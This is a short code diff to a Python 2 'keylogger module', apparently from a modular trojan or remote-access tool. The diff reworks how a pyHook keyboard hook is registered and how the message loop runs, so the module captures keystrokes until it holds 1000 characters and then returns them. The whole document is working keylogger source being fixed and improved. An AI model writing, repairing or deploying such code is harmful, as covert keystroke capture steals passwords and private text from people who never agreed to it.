@@ -77,14 +77,16 @@ def run(**args):
     print "[*] In keylogger module."
     
     try:
+    
+        # create and register a hook manager
+        kl         = pyHook.HookManager()
+        kl.KeyDown = KeyStroke
+        
+        # register the hook and execute forever
+        kl.HookKeyboard()
         while len(data) < 1000:
-            # create and register a hook manager
-            kl         = pyHook.HookManager()
-            kl.KeyDown = KeyStroke
-            
-            # register the hook and execute forever
-            kl.HookKeyboard()
-            pythoncom.PumpMessages()
+            pythoncom.PumpWaitingMessages()
     except KeyboardInterrupt:
         return data
+    print "[*] Keylogging complete."
     return data
